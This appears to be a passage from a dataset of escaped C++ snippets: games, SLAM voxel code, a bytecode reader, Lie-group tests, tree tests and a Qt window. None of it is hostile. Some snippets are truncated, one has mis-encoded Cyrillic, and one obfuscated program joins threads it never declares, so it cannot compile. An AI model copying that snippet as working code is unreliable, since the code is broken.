\\n\";\n    }\n}\n\nvoid displayattempt(int attempt)\n{\n    if (attempt == 0)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 1)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 2)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 3)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|   | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 4)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 5)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \" /    | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n    else if (attempt == 6)\n    {\n        std::cout << \"  +---+ \\n\";\n        std::cout << \"  |   | \\n\";\n        std::cout << \"  O   | \\n\";\n        std::cout << \" /|\\\\  | \\n\";\n        std::cout << \" / \\\\  | \\n\";\n        std::cout << \"      | \\n\";\n        std::cout << \" ========= \\n\";\n    }\n}\n\nvoid displaystatus(vector<char> incorrect, string answer)\n{\n    for (int i = 0; i < incorrect.size(); i++)\n    {\n        std::cout << incorrect[i] << \" \";\n    }\n\n    std::cout << \"\\n\u00c7\u00e0\u00e3\u00e0\u00e4\u00e0\u00ed\u00ed\u00ee\u00e5 \u00f1\u00eb\u00ee\u00e2\u00ee:\\n\";\n\n    for (int i = 0; i < answer.length(); i++)\n    {\n        std::cout << answer[i] << \" \";\n    }\n}\n\nvoid endgame(string answer, string codeword)\n{\n    if (answer == codeword)\n    {\n        std::cout << \"\u00c2\u00fb \u00ef\u00ee\u00e1\u00e5\u00e4\u00e8\u00eb\u00e8\\n\";\n        std::cou",
    "/*\n * Voxel.cpp\n *\n *  Created on: Oct 20, 2021\n *      Author: jelavice\n */\n\n#include \"open3d_slam/Voxel.hpp\"\n#include <iostream>\n#include <numeric>\n#include <unordered_set>\n#include \"open3d_slam/time.hpp\"\n\nnamespace o3d_slam {\n\nconst Eigen::Vector3d zero3d(0.0, 0.0, 0.0);\n\nEigen::Vector3d AggregatedVoxel::getAggregatedPosition() const {\n  return numAggregatedPoints_ == 0 ? zero3d : aggregatedPosition_ / numAggregatedPoints_;\n}\nEigen::Vector3d AggregatedVoxel::getAggregatedNormal() const {\n  return numAggregatedPoints_ == 0 ? zero3d : aggregatedNormal_ / numAggregatedPoints_;\n}\nEigen::Vector3d AggregatedVoxel::getAggregatedColor() const {\n  return numAggregatedPoints_ == 0 ? zero3d : aggregatedColor_ / numAggregatedPoints_;\n}\nvoid AggregatedVoxel::aggregatePoint(const Eigen::Vector3d& p) {\n  aggregatedPosition_ += p;\n  ++numAggregatedPoints_;\n}\nvoid AggregatedVoxel::aggregateNormal(const Eigen::Vector3d& normal) {\n  aggregatedNormal_ += normal;\n}\nvoid AggregatedVoxel::aggregateColor(const Eigen::Vector3d& c) {\n  aggregatedColor_ += c;\n}\n\nVoxelizedPointCloud::VoxelizedPointCloud() : VoxelizedPointCloud(Eigen::Vector3d::Constant(0.25)) {}\n\nVoxelizedPointCloud::VoxelizedPointCloud(const Eigen::Vector3d& voxelSize) : BASE(voxelSize) {}\n\nbool VoxelizedPointCloud::hasColors() const {\n  return isHasColors_;\n}\nbool VoxelizedPointCloud::hasNormals() const {\n  return isHasNormals_;\n}\n\nvoid VoxelizedPointCloud::transform(const Transform& T) {\n  std::unordered_map<Eigen::Vector3i, AggregatedVoxel, EigenVec3iHash> voxels;\n  if (empty()) {\n    return;\n  }\n  voxels.reserve(voxels_.size());\n  for (const auto& v : voxels_) {\n    if (v.second.numAggregatedPoints_ > 0) {\n      AggregatedVoxel vTransformed(v.second);\n      vTransformed.aggregatedNormal_ = T * vTransformed.aggregatedNormal_;\n      vTransformed.aggregatedPosition_ = T * vTransformed.aggregatedPosition_;\n      voxels[v.first] = vTransformed;\n    }\n  }\n  voxels_ = std::move(voxels);\n}\n\nvoid VoxelizedPointCloud::insert(const open3d::geometry::PointCloud& cloud) {\n  for (size_t i = 0; i < cloud.points_.size(); ++i) {\n    const auto voxelIdx = getKey(cloud.points_[i]);\n    auto search = voxels_.find(voxelIdx);\n    if (search == voxels_.end()) {\n      auto insertResult = voxels_.insert({voxelIdx, AggregatedVoxel()});\n      if (!insertResult.second) {\n        std::cerr << \"VoxelizedPointCloud:: Insertion failed \\n\";\n        return;\n      }\n      search = insertResult.first;\n    }\n    search->second.aggregatePoint(cloud.points_[i]);\n    if (cloud.HasNormals()) {\n      search->second.aggregateNormal(cloud.normals_[i]);\n      isHasNormals_ = true;\n    }\n    if (cloud.HasColors()) {\n      search->second.aggregateColor(cloud.colors_[i]);\n      isHasColors_ = true;\n    }\n  }\n}\n\nPointCloud VoxelizedPointCloud::toPointCloud() const {\n  if (empty()) {\n    return PointCloud();\n  }\n  PointCloud ret;\n  ret.points_.reserve(voxels_.size());\n  if (isHasNormals_) {\n    ret.normals_.reserve(voxels_.size());\n  }\n  if (isHasColors_) {\n    ret.colors_.reserve(voxels_.size());\n  }\n  for (const auto& voxel : voxels_) {\n    if (voxel.second.numAggregatedPoints_ > 0) {\n      ret.points_.push_back(voxel.second.getAggregatedPosition());\n      if (isHasNormals_) {\n        ret.normals_.push_back(voxel.second.getAggregatedNormal());\n      }\n      if (isHasColors_) {\n        ret.colors_.push_back(voxel.second.getAggregatedColor());\n      }\n    }\n  }\n  return ret;\n}\n\n//////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////\n\nVoxelMap::VoxelMap() : VoxelMap(Eigen::Vector3d::Constant(0.25)) {}\nVoxelMap::VoxelMap(const Eigen::Vector3d& voxelSize) : BASE(voxelSize) {}\n\nvoid VoxelMap::insertCloud(const std::string& layer, const open3d::geometry::PointCloud& cloud, const std::vector<size_t>& idxs) {\n  for (size_t i = 0; i < idxs.size(); ++i) {\n    const size_t idx = idxs[i];\n    const auto voxelIdx = getKey(cloud.points_[idx]);\n    voxels_[voxelIdx].idxs_[layer].emplace_back(idx);\n  }\n}\nvoid VoxelMap::insertCloud(const std::string& layer, const open3d::geometry::PointCloud& cloud) {\n  std::vector<size_t> idxs(cloud.points_.size());\n  std::iota(idxs.begin(), idxs.end(), 0);\n  insertCloud(layer, cloud, idxs);\n}\n\nstd::vector<size_t> VoxelMap::getIndicesInVoxel(const std::string& layer, const Eigen::Vector3d& p) const {\n  return getIndicesInVoxel(layer, getKey(p));\n}\n\nstd::vector<size_t> VoxelMap::getIndicesInVoxel(const std::string& layer, const Eigen::Vector3i& key) const {\n  const auto searchVoxel = voxels_.find(key);\n  if (searchVoxel != voxels_.end()) {\n    const auto searchLayer = searchVoxel->second.idxs_.find(layer);\n    if (searchLayer != searchVoxel->second.idxs_.end()) {\n      return searchLayer->second;\n    }\n  }\n  return std::vector<size_t>();\n}\n\nbool VoxelMap::isVoxelHasLayer(const Eigen::Vector3i& key, const std::string& layer) const {\n  const auto searchVoxel = voxels_.find(k",
    "#include <iostream>\n#include <vector>\n#include <thread>\n#include <mutex>\n#include <future>\n#include <random>\n#include <functional>\n#include <string>\n#include <sstream>\n#include <chrono>\n#include <algorithm>\n\nnamespace __AA {\n    std::mutex __bb;\n    std::string __cc = \"Hello\";\n    std::string __dd = \"World))\";\n\n    template<typename __TT>\n    void __ff(__TT __x) {\n        std::lock_guard<std::mutex> __lg(__bb);\n        __cc += __x;\n    }\n\n    void __gg() {\n        std::lock_guard<std::mutex> __lg(__bb);\n        __cc += __dd;\n    }\n\n    std::string __hh() {\n        std::lock_guard<std::mutex> __lg(__bb);\n        return __cc;\n    }\n}\n\nclass __Builder {\npublic:\n    __Builder(const std::string& __start) : __data(__start) {}\n\n    void __add(const std::string& __part) {\n        __data += __part;\n    }\n\n    std::string __build() {\n        return __data;\n    }\n\nprivate:\n    std::string __data;\n};\n\ntemplate<typename __TT>\nvoid __async_task(std::promise<__TT>&& __pr, const std::string& __msg) {\n    std::this_thread::sleep_for(std::chrono::milliseconds(100));\n    __pr.set_value(__msg);\n}\n\nint main() {\n    std::promise<std::string> __promise1;\n    std::promise<std::string> __promise2;\n    std::future<std::string> __future1 = __promise1.get_future();\n    std::future<std::string> __future2 = __promise2.get_future();\n\n    __t1.join();\n    __t2.join();\n\n    __AA::__ff(__future1.get());\n    __AA::__ff(__future2.get());\n\n    __AA::__gg();\n\n    std::string __result = __AA::__hh();\n\n    std::cout << __result << std::endl;\n\n    return 0;\n}\n",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QRandomGenerator>\n#include <QMessageBox>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    buttons = {ui->first_pushButton, ui->second_pushButton, ui->third_pushButton, ui->fourth_pushButton};\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::on_startGame_pushButton_clicked()\n{\n    clearGame();\n    userClickNumber = ui->userNumber_lineEdit->text().toInt();\n    if (userClickNumber <= 0) {\n        QMessageBox::information(this, \"Information\", \"Enter correct number\");\n        return;\n    }\n    else {\n        ui->game_progressBar->setRange(0, userClickNumber);\n        ui->game_progressBar->setValue(0);\n        randomButtons();\n        gameTimer.start();\n    }\n}\n\nvoid MainWindow::randomButtons()\n{\n    buttonCorrectIndex = QRandomGenerator::global()->bounded(buttons.size());\n\n    for (int i = 0; i < buttons.size(); i++) {\n        if (i == buttonCorrectIndex) {\n            buttons[i]->setText(\"Click\");\n        }\n        else {\n            buttons[i]->setText(\"\");\n        }\n    }\n}\n\nvoid MainWindow::clearGame()\n{\n    userCorrectClicks = 0;\n    buttonCorrectIndex = -1;\n    ui->first_pushButton->setText(\"Click\");\n    ui->second_pushButton->setText(\"Click\");\n    ui->third_pushButton->setText(\"Click\");\n    ui->fourth_pushButton->setText(\"Click\");\n    ui->scoreboard_listWidget->clear();\n    ui->game_progressBar->reset();\n}\n\nvoid MainWindow::on_first_pushButton_clicked()\n{\n    checkCorrectButtonClicked(0);\n}\n\nvoid MainWindow::on_second_pushButton_clicked()\n{\n    checkCorrectButtonClicked(1);\n}\n\nvoid MainWindow::on_third_pushButton_clicked()\n{\n    checkCorrectButtonClicked(2);\n}\n\nvoid MainWindow::on_fourth_pushButton_clicked()\n{\n    checkCorrectButtonClicked(3);\n}\n\nvoid MainWindow::checkCorrectButtonClicked(int buttonIndex)\n{\n    if (buttonIndex == buttonCorrectIndex) {\n        userCorrectClicks = userCorrectClicks + 1;\n        ui->game_progressBar->setValue(userCorrectClicks);\n\n        if (userCorrectClicks == userClickNumber) {\n            qint64 userTime = gameTimer.elapsed();\n            ui->scoreboard_listWidget->addItem(\"Your time: \" + QString::number(userTime) + \" ms\");\n            ui->first_pushButton->setText(\"Click\");\n            ui->second_pushButton->setText(\"Click\");\n            ui->third_pushButton->setText(\"Click\");\n            ui->fourth_pushButton->setText(\"Click\");\n            ui->game_progressBar->reset();\n        }\n        else {\n            randomButtons();\n        }\n    }\n    else {\n        QMessageBox::information(this, \"Information\", \"You clicked the wrong button, the game has been reset\");\n        clearGame();\n    }\n}\n",
    "#include \"reader.hpp\"\n\nElpReader::ElpReader(string path) : path(path) {\n    file = fopen(path.c_str(), \"rb\");\n    if (file == null) throw errors::FileNotFoundError(path);\n}\n\nvoid ElpReader::close() const {\n    fclose(file);\n}\n\nElpInfo ElpReader::read() {\n    ElpInfo elp{};\n    elp.magic = readInt();\n    elp.minorVersion = readInt();\n    elp.majorVersion = readInt();\n    elp.compiledFrom = readShort();\n    elp.type = readByte();\n    elp.thisModule = readShort();\n    elp.init = readShort();\n    elp.entry = readShort();\n    elp.imports = readShort();\n    elp.constantPoolCount = readShort();\n    elp.constantPool = new CpInfo[elp.constantPoolCount];\n    for (int i = 0; i < elp.constantPoolCount; ++i) {\n        elp.constantPool[i] = readCpInfo();\n    }\n    elp.globalsCount = readShort();\n    elp.globals = new GlobalInfo[elp.globalsCount];\n    for (int i = 0; i < elp.globalsCount; ++i) {\n        elp.globals[i] = readGlobalInfo();\n    }\n    elp.objectsCount = readShort();\n    elp.objects = new ObjInfo[elp.objectsCount];\n    for (int i = 0; i < elp.objectsCount; ++i) {\n        elp.objects[i] = readObjInfo();\n    }\n    elp.meta = readMetaInfo();\n    // Reset the index to zero so that the file can be read again\n    index = 0;\n    return elp;\n}\n\nMetaInfo ElpReader::readMetaInfo() {\n    MetaInfo meta{};\n    meta.len = readShort();\n    meta.table = new MetaInfo::__meta[meta.len];\n    for (int i = 0; i < meta.len; ++i) {\n        MetaInfo::__meta entry{};\n        entry.key = readUTF8();\n        entry.value = readUTF8();\n        meta.table[i] = entry;\n    }\n    return meta;\n}\n\nObjInfo ElpReader::readObjInfo() {\n    ObjInfo obj{};\n    obj.type = readByte();\n    switch (obj.type) {\n        case 0x01:\n            obj._method = readMethodInfo();\n            break;\n        case 0x02:\n            obj._class = readClassInfo();\n            break;\n        default:\n            corruptFileError();\n    }\n    return obj;\n}\n\nClassInfo ElpReader::readClassInfo() {\n    ClassInfo klass{};\n    klass.type = readByte();\n    klass.accessFlags = readShort();\n    klass.thisClass = readShort();\n    klass.typeParamCount = readByte();\n    klass.typeParams = new TypeParamInfo[klass.typeParamCount];\n    for (int i = 0; i < klass.typeParamCount; ++i) {\n        klass.typeParams[i] = readTypeParamInfo();\n    }\n    klass.supers = readShort();\n    klass.fieldsCount = readShort();\n    klass.fields = new FieldInfo[klass.fieldsCount];\n    for (int i = 0; i < klass.fieldsCount; ++i) {\n        klass.fields[i] = readFieldInfo();\n    }\n    klass.methodsCount = readShort();\n    klass.methods = new MethodInfo[klass.methodsCount];\n    for (int i = 0; i < klass.methodsCount; ++i) {\n        klass.methods[i] = readMethodInfo();\n    }\n    klass.objectsCount = readShort();\n    klass.objects = new ObjInfo[klass.objectsCount];\n    for (int i = 0; i < klass.objectsCount; ++i) {\n        klass.objects[i] = readObjInfo();\n    }\n    klass.meta = readMetaInfo();\n    return klass;\n}\n\nFieldInfo ElpReader::readFieldInfo() {\n    FieldInfo field{};\n    field.flags = readByte();\n    field.thisField = readShort();\n    field.type = readShort();\n    field.meta = readMetaInfo();\n    return field;\n}\n\nTypeParamInfo ElpReader::readTypeParamInfo() {\n    TypeParamInfo typeparam{};\n    typeparam.name = readShort();\n    return typeparam;\n}\n\nMethodInfo ElpReader::readMethodInfo() {\n    MethodInfo method{};\n    method.accessFlags = readShort();\n    method.type = readByte();\n    method.thisMethod = readShort();\n    method.typeParamCount = readByte();\n    method.typeParams = new TypeParamInfo[method.typeParamCount];\n    for (int i = 0; i < method.typeParamCount; ++i) {\n        method.typeParams[i] = readTypeParamInfo();\n    }\n    method.argsCount = readByte();\n    method.args = new MethodInfo::ArgInfo[method.argsCount];\n    for (int i = 0; i < method.argsCount; i++) {\n        method.args[i] = readArgInfo();\n    }\n    method.localsCount = readShort();\n    method.closureStart = readShort();\n    method.locals = new MethodInfo::LocalInfo[method.localsCount];\n    for (int i = 0; i < method.localsCount; i++) {\n        method.locals[i] = readLocalInfo();\n    }\n    method.maxStack = readInt();\n    method.codeCount = readInt();\n    method.code = new uint8[method.codeCount];\n    for (int i = 0; i < method.codeCount; i++) {\n        method.code[i] = readByte();\n    }\n    method.exceptionTableCount = readShort();\n    method.exceptionTable =\n            new MethodInfo::ExceptionTableInfo[method.exceptionTableCount];\n    for (int i = 0; i < method.exceptionTableCount; i++) {\n        method.exceptionTable[i] = readExceptionInfo();\n    }\n    method.lineInfo = readLineInfo();\n    method.lambdaCount = readShort();\n    method.lambdas = new MethodInfo[method.lambdaCount];\n    for (int i = 0; i < method.lambdaCount; i++) {\n        method.lambdas[i] = readMethodInfo();\n    }\n    method.matchCount = readShort();\n    method.matches = new MethodInfo::MatchInfo[method.matchCount];\n    for (int i = 0; i < method.matchCount; i+",
    "#include <iostream>\n\n#include <sophus/se2.hpp>\n#include <unsupported/Eigen/MatrixFunctions>\n#include \"tests.hpp\"\n\n// Explicit instantiate all class templates so that all member methods\n// get compiled and for code coverage analysis.\nnamespace Eigen {\ntemplate class Map<Sophus::SE2<double>>;\ntemplate class Map<Sophus::SE2<double> const>;\n}  // namespace Eigen\n\nnamespace Sophus {\n\ntemplate class SE2<double, Eigen::AutoAlign>;\ntemplate class SE2<double, Eigen::DontAlign>;\n#if SOPHUS_CERES\ntemplate class SE2<ceres::Jet<double, 3>>;\n#endif\n\ntemplate <class Scalar>\nclass Tests {\n public:\n  using SE2Type = SE2<Scalar>;\n  using SO2Type = SO2<Scalar>;\n  using Point = typename SE2<Scalar>::Point;\n  using Tangent = typename SE2<Scalar>::Tangent;\n  Scalar const kPi = Constants<Scalar>::pi();\n\n  Tests() {\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.0)), Point(Scalar(0), Scalar(0))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.2)), Point(Scalar(10), Scalar(0))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.)), Point(Scalar(0), Scalar(100))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(-1.)), Point(Scalar(20), -Scalar(1))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.00001)),\n                Point(Scalar(-0.00000001), Scalar(0.0000000001))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.2)), Point(Scalar(0), Scalar(0))) *\n        SE2Type(SO2Type(kPi), Point(Scalar(0), Scalar(0))) *\n        SE2Type(SO2Type(Scalar(-0.2)), Point(Scalar(0), Scalar(0))));\n    se2_vec_.push_back(\n        SE2Type(SO2Type(Scalar(0.3)), Point(Scalar(2), Scalar(0))) *\n        SE2Type(SO2Type(kPi), Point(Scalar(0), Scalar(0))) *\n        SE2Type(SO2Type(Scalar(-0.3)), Point(Scalar(0), Scalar(6))));\n\n    Tangent tmp;\n    tmp << Scalar(0), Scalar(0), Scalar(0);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(1), Scalar(0), Scalar(0);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(0), Scalar(1), Scalar(1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(-1), Scalar(1), Scalar(0);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(20), Scalar(-1), Scalar(-1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(30), Scalar(5), Scalar(20);\n    tangent_vec_.push_back(tmp);\n\n    point_vec_.push_back(Point(1, 2));\n    point_vec_.push_back(Point(1, -3));\n  }\n\n  void runAll() {\n    bool passed = testLieProperties();\n    passed &= testRawDataAcces();\n    passed &= testMutatingAccessors();\n    passed &= testConstructors();\n    passed &= testFit();\n    processTestResult(passed);\n  }\n\n private:\n  bool testLieProperties() {\n    LieGroupTests<SE2Type> tests(se2_vec_, tangent_vec_, point_vec_);\n    return tests.doAllTestsPass();\n  }\n\n  bool testRawDataAcces() {\n    bool passed = true;\n    Eigen::Matrix<Scalar, 4, 1> raw;\n    raw << Scalar(0), Scalar(1), Scalar(0), Scalar(3);\n    Eigen::Map<SE2Type const> const_se2_map(raw.data());\n    SOPHUS_TEST_APPROX(passed, const_se2_map.unit_complex().eval(),\n                       raw.template head<2>().eval(),\n                       Constants<Scalar>::epsilon());\n    SOPHUS_TEST_APPROX(passed, const_se2_map.translation().eval(),\n                       raw.template tail<2>().eval(),\n                       Constants<Scalar>::epsilon());\n    SOPHUS_TEST_EQUAL(passed, const_se2_map.unit_complex().data(), raw.data());\n    SOPHUS_TEST_EQUAL(passed, const_se2_map.translation().data(),\n                      raw.data() + 2);\n    Eigen::Map<SE2Type const> const_shallow_copy = const_se2_map;\n    SOPHUS_TEST_EQUAL(passed, const_shallow_copy.unit_complex().eval(),\n                      const_se2_map.unit_complex().eval());\n    SOPHUS_TEST_EQUAL(passed, const_shallow_copy.translation().eval(),\n                      const_se2_map.translation().eval());\n\n    Eigen::Matrix<Scalar, 4, 1> raw2;\n    raw2 << Scalar(1), Scalar(0), Scalar(3), Scalar(1);\n    Eigen::Map<SE2Type> map_of_se3(raw.data());\n    map_of_se3.setComplex(raw2.template head<2>());\n    map_of_se3.translation() = raw2.template tail<2>();\n    SOPHUS_TEST_APPROX(passed, map_of_se3.unit_complex().eval(),\n                       raw2.template head<2>().eval(),\n                       Constants<Scalar>::epsilon());\n    SOPHUS_TEST_APPROX(passed, map_of_se3.translation().eval(),\n                       raw2.template tail<2>().eval(),\n                       Constants<Scalar>::epsilon());\n    SOPHUS_TEST_EQUAL(passed, map_of_se3.unit_complex().data(), raw.data());\n    SOPHUS_TEST_EQUAL(passed, map_of_se3.translation().data(), raw.data() + 2);\n    SOPHUS_TEST_NEQ(passed, map_of_se3.unit_complex().data(), raw2.data());\n    Eigen::Map<SE2Type> shallow_copy = map_of_se3;\n    SOPHUS_TEST_EQUAL(passed, shallow_copy.unit_complex().eval(),\n                      map_of_se3.unit_complex().eval());\n    SOPHUS_TEST_EQUAL(passed, shallow_copy.translation().eval(),\n                      map_of_se3.translation().eval());\n    Eigen::Map<SE2Type> const const_map_of_se2 = map_of_se3;\n    SOPHUS_TEST_EQUAL(passed, const_map_o",
    "#include<iostream>\r\n#include\"RedBlackTree.h\"\r\n#include\"ArrayBinaryTree.h\"\r\n#include <cassert>\r\n#include<sstream>\r\nusing namespace std;\r\n\r\nclass LinkedListBinaryTreeTest {\r\npublic:\r\n\tstatic void insertTest() {\r\n        LinkedListBinaryTree llbt;\r\n\r\n        // \u63d2\u5165\u503c 6\r\n        llbt.insert(6);\r\n        assert(llbt.getRoot() != nullptr);\r\n        assert(llbt.getRoot()->value == 6);\r\n        assert(llbt.getRoot()->left == nullptr);\r\n        assert(llbt.getRoot()->right == nullptr);\r\n\r\n        // \u63d2\u5165\u503c 4\r\n        llbt.insert(4);\r\n        assert(llbt.getRoot()->left != nullptr);\r\n        assert(llbt.getRoot()->left->value == 4);\r\n        assert(llbt.getRoot()->left->left == nullptr);\r\n        assert(llbt.getRoot()->left->right == nullptr);\r\n\r\n        // \u63d2\u5165\u503c 8\r\n        llbt.insert(8);\r\n        assert(llbt.getRoot()->right != nullptr);\r\n        assert(llbt.getRoot()->right->value == 8);\r\n        assert(llbt.getRoot()->right->left == nullptr);\r\n        assert(llbt.getRoot()->right->right == nullptr);\r\n\r\n        cout << \"LinkedList insert correct\" << endl;\r\n\t}\r\n\r\n    static void preorderTest() {\r\n\r\n        /*\r\n        excepted :\r\n                6\r\n               / \\\r\n              4   8\r\n            preorder result 6 4 8\r\n        */\r\n        LinkedListBinaryTree llbt;\r\n        llbt.insert(6);\r\n        llbt.insert(4);\r\n        llbt.insert(8);\r\n\r\n        // \u91cd\u5b9a\u5411\u6807\u51c6\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\u6d41\r\n        std::stringstream buffer;\r\n        std::streambuf* old = std::cout.rdbuf(buffer.rdbuf());\r\n\r\n        // \u8c03\u7528\u524d\u5e8f\u904d\u5386\r\n        llbt.preorder();\r\n\r\n        // \u6062\u590d\u6807\u51c6\u8f93\u51fa\r\n        std::cout.rdbuf(old);\r\n\r\n        // \u83b7\u53d6\u8f93\u51fa\u7ed3\u679c\u5e76\u9a8c\u8bc1\r\n        std::string result = buffer.str();\r\n        std::string expected = \"6 4 8 \\n\";\r\n\r\n        assert(result == expected);\r\n        cout << \"LinkedList preorder correct\" << endl;\r\n    }\r\n\r\n    static void inorderTest() {\r\n\r\n        /*\r\n        excepted :\r\n                6\r\n               / \\\r\n              4   8\r\n            preorder result 4 6 8\r\n        */\r\n        LinkedListBinaryTree llbt;\r\n        llbt.insert(6);\r\n        llbt.insert(4);\r\n        llbt.insert(8);\r\n\r\n        // \u91cd\u5b9a\u5411\u6807\u51c6\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\u6d41\r\n        stringstream buffer;\r\n        streambuf* old = std::cout.rdbuf(buffer.rdbuf());\r\n\r\n        // \u8c03\u7528\u4e2d\u5e8f\u904d\u5386\r\n        llbt.inorder();\r\n\r\n        // \u6062\u590d\u6807\u51c6\u8f93\u51fa\r\n        cout.rdbuf(old);\r\n\r\n        // \u83b7\u53d6\u8f93\u51fa\u7ed3\u679c\u5e76\u9a8c\u8bc1\r\n        string result = buffer.str();\r\n        string expected = \"4 6 8 \\n\";\r\n\r\n        assert(result == expected);\r\n        cout << \"LinkedList inorder correct\" << endl;\r\n    }\r\n    /*\r\n        \u4e0d\u5199\u6d4b\u8bd5\u4e86\uff01\uff01\uff01\r\n        \u5199\u6d4b\u8bd5\u592a\u7d2f\u4e86\uff01\uff01\uff01\r\n    */\r\n};\r\n\r\n\r\nint main() {\r\n   /* LinkedListBinaryTreeTest::insertTest();\r\n\r\n    LinkedListBinaryTreeTest::preorderTest();\r\n\r\n    LinkedListBinaryTreeTest::inorderTest();*/\r\n\r\n    BinaryTree* llbt = new RedBlackTree(); //\u5229\u7528\u591a\u6001\r\n\r\n    llbt->insert(6);\r\n    llbt->insert(4);\r\n    llbt->insert(8);\r\n    llbt->insert(2);\r\n    llbt->insert(5);\r\n    llbt->insert(12);\r\n    llbt->insert(35);\r\n    llbt->insert(28);\r\n    llbt->insert(45);\r\n    llbt->insert(0);\r\n    llbt->insert(-5);\r\n    llbt->insert(-7);\r\n\r\n    llbt->levelorder();\r\n\r\n    // \u4f3c\u4e4e\u4fdd\u6301\u4e86\u5e73\u8861\r\n}\r\n\r\n",
    "#include <iostream>\n\ndouble SQRT(double value) {\n    if (value < 0) {\n        return -1;\n    }\n\n    if (value == 0) {\n        return 0;\n    }\n\n    double U = value;\n    double accuracy = 1e-7;\n    double estimate = value / 2.0;\n\n    while (std::abs(estimate - U) > accuracy) {\n        U = estimate;\n        estimate = (U + value / U) / 2.0;\n    }\n\n    return estimate;\n}\n\n// 1. ax^4 + bx^2 + c = 0;\n\nint main() {\n    double a = 0, b = 0, c = 0, D = 0, y1 = 0, y2 = 0;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442\u044b a, b, c \u0434\u043b\u044f \u0443\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f ax^4 + bx^2 + c = 0: \" << std::endl;\n    std::cin >> a >> b >> c;\n\n    D = b * b - 4 * a * c;\n\n    if (D < 0) {\n        std::cout << \"\u041d\u0435\u0442 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u0440\u043d\u0435\u0439.\" << std::endl;\n    } else {\n        y1 = (-b + SQRT(D)) / (2 * a);\n        y2 = (-b - SQRT(D)) / (2 * a);\n\n        if (y1 >= 0) {\n            std::cout << \"x1 = \" << SQRT(y1) << \", x2 = \" << -SQRT(y1) << std::endl;\n        }\n        if (y2 >= 0) {\n            std::cout << \"x3 = \" << SQRT(y2) << \", x4 = \" << -SQRT(y2) << std::endl;\n        }\n        if (y1 < 0 && y2 < 0) {\n            std::cout << \"\u041d\u0435\u0442 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u0440\u043d\u0435\u0439.\" << std::endl;\n        }\n    }\n\n    return 0;\n}\n\n\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"QMessageBox\"\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    this->settingProgramm();\n    this->createSignalSlotConnections();\n\n}\n\n//----------------------------------------------------------------------------------------------------\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n//----------------------------------------------------------------------------------------------------\n\n//\u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\nvoid MainWindow::settingProgramm()\n{\n    this->resize(400, 300);\n    this->setWindowTitle(\"\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043e\u043a\u043d\u043e\");\n    this->setWindowIcon(QIcon(\":/icons/icons/rocket.png\"));\n    this->setWindowFlags(windowFlags() & ~Qt::WindowCloseButtonHint);\n\n    m_pSecondWindow = nullptr;\n    m_isSoundOn = true;\n\n    ui->sound_menu->setIcon(QIcon(\":/icons/icons/notes.ico\"));\n    ui->soundOn_action->setIcon(QIcon(\":/icons/icons/soundOn.ico\"));\n    ui->soundOn_action->setText(\"\u0412\u043a\u043b. \\u2713\");\n    